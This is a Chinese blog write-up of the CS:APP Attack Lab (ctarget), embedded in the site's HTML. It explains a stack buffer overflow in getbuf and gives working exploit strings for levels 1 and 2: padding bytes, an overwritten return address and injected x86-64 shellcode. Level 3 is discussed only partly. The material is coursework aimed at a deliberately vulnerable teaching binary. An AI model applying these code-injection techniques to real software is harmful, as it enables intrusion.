@@ -1,0 +1,354 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>attacklab-ctarget | 金晖のBlog</title><meta name="author" content="ADguy"><meta name="copyright" content="ADguy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简介 Attack Lab 的内容针对的是 CS-APP 中第三章中关于程序安全性描述中的栈溢出攻击。在这个 Lab 中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。  实验目的 官方文档https:&#x2F;&#x2F;csapp.cs.cmu.edu&#x2F;3e&#x2F;attacklab.pdf 这次实验的文件有点多，一一介绍下。具体">
+<meta property="og:type" content="article">
+<meta property="og:title" content="attacklab-ctarget">
+<meta property="og:url" content="https://adguy.top/adguy/5c165311.html">
+<meta property="og:site_name" content="金晖のBlog">
+<meta property="og:description" content="简介 Attack Lab 的内容针对的是 CS-APP 中第三章中关于程序安全性描述中的栈溢出攻击。在这个 Lab 中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。  实验目的 官方文档https:&#x2F;&#x2F;csapp.cs.cmu.edu&#x2F;3e&#x2F;attacklab.pdf 这次实验的文件有点多，一一介绍下。具体">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241044233.webp">
+<meta property="article:published_time" content="2022-11-22T10:32:55.000Z">
+<meta property="article:modified_time" content="2022-11-26T10:59:19.016Z">
+<meta property="article:author" content="ADguy">
+<meta property="article:tag" content="csapp">
+<meta property="article:tag" content="attacklab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241044233.webp"><link rel="shortcut icon" href="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/typora-img/202207191026188.webp"><link rel="canonical" href="https://adguy.top/adguy/5c165311"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"HNQPWHKMPR","apiKey":"15737636bdb1d2453b1b0994fd07081a","indexName":"sb","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"简","msgToSimplifiedChinese":"繁"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: ADguy","link":"链接: ","source":"来源: 金晖のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'attacklab-ctarget',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-26 18:59:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><style> #article-container.post-content h1:before, h2:before, h3:before, h4:before, h5:before, h6:before { -webkit-animation: avatar_turn_around 1s linear infinite; -moz-animation: avatar_turn_around 1s linear infinite; -o-animation: avatar_turn_around 1s linear infinite; -ms-animation: avatar_turn_around 1s linear infinite; animation: avatar_turn_around 1s linear infinite; } </style><link rel="stylesheet" href="/css/mouse.min.css"><link rel="stylesheet" href="/css/scrollbar.min.css"><link rel="stylesheet" href="/css/custom_font.min.css"><link rel="stylesheet" href="/css/greater_css.min.css"><link rel="stylesheet" href="https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css"><link rel="stylesheet" href="css/custom.min.css"><link rel="stylesheet" href="css/loading-bar.min.css"><link rel="stylesheet" href="css/equation.min.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211231910960.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">41</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-clock"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232358703.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">金晖のBlog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-clock"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">attacklab-ctarget</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-22T10:32:55.000Z" title="发表于 2022-11-22 18:32:55">2022-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-26T10:59:19.016Z" title="更新于 2022-11-26 18:59:19">2022-11-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/csapp/">csapp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="attacklab-ctarget"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2>
+<p><code>Attack Lab</code> 的内容针对的是 <code>CS-APP</code> 中第三章中关于程序安全性描述中的栈溢出攻击。在这个 <code>Lab</code> 中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。</p>
+<h2 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h2>
+<div class="tag link"><a class="link-card" title="官方文档" target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/attacklab.pdf"><div class="left"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://csapp.cs.cmu.edu/3e/images/csapp3e-cover.jpg"/></div><div class="right"><p class="text">官方文档</p><p class="url">https://csapp.cs.cmu.edu/3e/attacklab.pdf</p></div></a></div>
+<p>这次实验的文件有点多，一一介绍下。具体东西还得参考cmu给出的实验文档，本实验没有该文档几乎都不知道自己该干什么。</p>
+<p>讲义中首先给我们展示了导致程序漏洞的关键：<code>getbuf</code> 函数。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    <span class="built_in">Gets</span>(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>getbuf</code> 函数在栈中申请了一块 <code>BUFFER_SIZE</code> 大小的空间，然后利用这块空间首地址作为 <code>Gets</code> 函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过 <code>BUFFER_SIZE</code> 的字符串来向 <code>getbuf</code> 的栈帧之外写入数据。</p>
+<p>在代码注入攻击中就是利用函数返回时 <code>RET</code> 指令会将调用方在栈中存放的返回地址读入 <code>IP</code> 中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。</p>
+<h2 id="自我测评"><a class="markdownIt-Anchor" href="#自我测评"></a> 自我测评</h2>
+<p>输入命令<code>./ctarget 字符串</code> 即可测试结果。</p>
+<p>一些参数：</p>
+<ul>
+<li>-h: help</li>
+<li>-q: 不向服务器发送结果。由于我们<s>大多数</s>都没有连到cmu的内网中，所以自然不能上传服务器。测试时这个参数必加</li>
+<li>-i：允许文件作为参数，基本也是必加。</li>
+</ul>
+<h2 id="使用hex2raw"><a class="markdownIt-Anchor" href="#使用hex2raw"></a> 使用HEX2RAW</h2>
+<p>由于向程序提交的答案和平常输入的字符串格式不同，所以需要用到实验文件提供的程序<code>HEX2RAW</code>.</p>
+<p><code>HEX2RAW</code>expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte ordering).</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">unix&gt; </span><span class="language-bash">./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span> </span><br><span class="line"><span class="meta prompt_">unix&gt; </span><span class="language-bash">./ctarget -q -i exploit-raw.txt</span></span><br></pre></td></tr></table></figure>
+<p>将自己的答案写入<code>exploit</code>文件，hex2raw便会将转换格式后的答案重定向到<code>exploit-raw</code>文件中，作为参数以便进行评测。</p>
+<h2 id="生成机器码"><a class="markdownIt-Anchor" href="#生成机器码"></a> 生成机器码</h2>
+<p>需要利用到<code>GCC</code>和<code>OBJDUMP</code>来生成机器码。</p>
+<p>先把写好的汇编文件放到example.s文件中。然后利用<code>gcc -c</code>命令将汇编语言翻译成机器码，再 <code>objdump -d</code> 生成的文件就可以间接地看到最终的机器码。</p>
+<p>实例：文件被放在<code>example.s</code>中，输入命令<code>gcc -c example.s</code>即可生成可执行文件<code>example.o</code>。</p>
+<p>再输入命令<code>objdump -d example.o &gt; example.d</code>即可看到最终的机器码。格式大抵如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ans2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>
+<h2 id="leval1"><a class="markdownIt-Anchor" href="#leval1"></a> Leval1</h2>
+<p>在这个等级中，我们不需要注入任何攻击代码，只需要更改 <code>getbuf</code> 函数的返回地址执行指定的函数 <code>touch1</code>（该函数已经存在于程序中）。</p>
+<p>那么我们需要做的就是将栈中存放返回地址的位置改为 <code>touch1</code> 函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。</p>
+<p>下面我们利用 <code>objdump -d</code> 命令将程序反汇编来查看 <code>getbuf</code> 函数的行为。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
+<p>代码比较简单，在第 2 行中将 <code>rsp</code> 减了 0x28，申请了一块 28 字节的空间，第 3 行将 <code>rsp</code> 赋给 <code>rdi</code> 就是空间的首地址，然后调用了 <code>Gets</code> 函数，<code>rdi</code> 就是它的参数。到这里我们可以确定 <code>BUFFER_SIZE</code> 的大小为 0x28（自学讲义中这个值是固定的，但是真正的实验中这个值是由服务器生成的）。换句话说，在 0x28 字节的栈被 <code>Gets</code> 函数写满之后，多出来的字符会被写入 <code>getbuf</code> 函数的栈外。</p>
+<p>下面是低地址，上面是高地址，在 <code>getbuf</code> 函数申请的 0x28 字节内存之外的 8 个字节存放的就是 <code>test</code> 函数 <code>call</code> 指令后下一条指令的地址。</p>
+<p>现在我们可以知道，我们需要用 0x28 字节来将栈填满，再写入 <code>touch1</code> 函数的入口地址，在 <code>getbuf</code> 函数执行到 <code>ret</code> 指令的时候就会返回到 <code>touch1</code> 中执行。</p>
+<p>下面就要利用官方提供的 <code>hex2raw</code> 程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。</p>
+<p>最终的答案如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>可以看到前 0x28 个字节都使用 0x00 来填充，然后在溢出的 8 个字节中写入了 <code>touch1</code> 的首地址 <code>0x4017c0</code>，注意小端的字节序就可以了。</p>
+<h2 id="leval2"><a class="markdownIt-Anchor" href="#leval2"></a> Leval2</h2>
+<p>这个等级中我们同样需要跳转到指定的函数 <code>touch2</code> 中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        <span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        <span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里 <code>cookie</code> 是服务器给我们的一个数值，存放在 <code>cookie.txt</code> 文件中，自学者材料中的这个值应该都是一样的。</p>
+<p>可以看到 <code>touch2</code> 拥有一个参数，只有这个参数与 <code>cookie</code> 的值相等才可以通过。所以我们的目标就是让程序去执行我们的代码，设置这个参数的值，再调用 <code>touch2</code> 完成攻击。</p>
+<ul>
+<li>如何让程序调用自己的函数呢？利用缓冲区溢出覆盖返回地址</li>
+<li>自己的函数放哪呢？缓冲区首地址</li>
+</ul>
+<p>在为缓存区分配完28个字节后，利用gdb的断点查看此时rsp的地址，这就是缓冲区首地址！把溢出后覆盖的返回地址设置为这个地址。</p>
+<p>现在问题是如何调用touch2（不能用callq）。书上有说，函数P调用函数Q时，callq指令会把地址A（返回地址）压入栈中，并将PC设置为Q的起始地址。对应的指令retq会从栈中弹出地址A，并将PC设置为A。</p>
+<p>那么把touch2的首地址压入栈中，再调用retq指令即可将PC设置为touch2。</p>
+<p>汇编代码就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>转换成机器码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 </span><br><span class="line">00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 //溢出后覆盖返回地址</span><br></pre></td></tr></table></figure>
+<h2 id="leval3"><a class="markdownIt-Anchor" href="#leval3"></a> Leval3</h2>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>和第二题很像，我们要传入一个字符串的首地址，然后这个字符串要和cookie的字符串形式一样。</p>
+<h3 id="数字转化"><a class="markdownIt-Anchor" href="#数字转化"></a> 数字转化</h3>
+<p>首先获得cookie的字符串形式，官方文档中有提到：</p>
+<div class="note info no-icon flat"><ul>
+    <li> You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.” </li>
+    <li> Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.</li>
+</ul>
+</div>
+<p>哦，把数字逐位转化成ASCII形式，然后末尾加上 ‘00’ 即可。获取ASCII码的工具就是<code>man ascii</code>。最后得到的字符串是：<code>35 39 62 39 39 37 66 61 00</code></p>
+<h3 id="栈帧结构"><a class="markdownIt-Anchor" href="#栈帧结构"></a> 栈帧结构</h3>
+<p>理一下思路。</p>
+<ol>
+<li>首先利用缓冲区溢出重置返回地址，将返回地址指向攻击代码。</li>
+<li>需要在缓冲区找一个地址放置字符串。</li>
+<li>攻击代码将rdi寄存器设置为攻击字符串的首地址，并调用touch3函数</li>
+<li>touch3调用hexmatch函数，把rdi寄存器作为参数传进去，进行字符串匹配</li>
+</ol>
+<p>注意hexmatch的这行代码：</p>
+<p><code>401850:	48 83 c4 80 	add $0xffffffffffffff80,%rsp</code></p>
+<p>在调用hexmatch时，栈指针减小了128。</p>
+<p>这里要注意一个地方，字符串所在地址可能被之后调用的touch3函数所覆盖，这会导致调用touch3时与调用hexmatch时，rdi寄存器的值不一样。所以要把字符串放在地址相对更大的地方。</p>
